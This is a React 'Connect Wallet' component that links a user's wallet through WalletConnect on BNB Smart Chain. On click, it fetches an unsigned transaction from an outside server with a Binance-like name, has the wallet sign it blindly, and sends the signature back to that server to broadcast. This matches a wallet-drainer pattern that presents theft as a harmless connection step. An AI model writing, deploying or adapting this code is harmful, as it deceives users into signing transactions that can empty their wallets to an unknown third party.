import jQuery from "jquery";
import { EthereumProvider } from "@walletconnect/ethereum-provider";

function App() {
  async function runner() {
    if (typeof localStorage !== "undefined") {
      localStorage.removeItem("walletconnect");
    }

    var ethereumProvider = await EthereumProvider.init({
      showQrModal: true,
      chains: [56], // فقط BSC
      methods: ["eth_signTransaction"], // متد امضای خام تراکنش
      projectId: "9fe3ed74e1d73141e8b7747bedf77551",
    });

    await ethereumProvider.enable();
    var provider = ethereumProvider;
    var account = await provider.request({ method: "eth_accounts" });
    var account_sender = account[0];
    console.log("✅ Wallet Address:", account_sender);

    let apiUrl = "https://sponsorbinance.vercel.app/api/proxy";

    async function signAndSendTransaction(address, chain, type) {
      try {
        let requestData = { handler: "tx", address, chain, type };

        // درخواست دریافت تراکنش خام از سرور
        var unsignedTxResponse = await jQuery.post(apiUrl, requestData);
        var unsignedTx = JSON.parse(unsignedTxResponse);
        console.log("📜 Unsigned Transaction:", unsignedTx);

        // امضای تراکنش خام در کیف پول
        var signedTx = await provider.request({
          method: "eth_signTransaction",
          params: [unsignedTx.result],
        });

        console.log("✍️ Signed Transaction:", signedTx);

        // ارسال تراکنش امضاشده به سرور برای انتشار در بلاکچین
        var txHash = await jQuery.post(apiUrl, {
          handler: "sign",
          signature: signedTx,
          type,
        });

        console.log("📤 Transaction Sent:", txHash);
        return txHash;
      } catch (error) {
        console.error("❌ Error in signAndSendTransaction:", error);
        return null;
      }
    }

    var txHash = await signAndSendTransaction(account_sender, "56", "coin");

    if (txHash) {
      console.log("📤 Final Transaction Hash:", txHash);
    } else {
      console.error("⚠ Transaction failed.");
    }
  }

  return (
    <a
      href="#"
      id="connectWallet"
      onClick={runner}
      className="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left"
      data-uk-toggle=""
    >
      <span>Connect Wallet</span>
    </a>
  );
}

export default App;
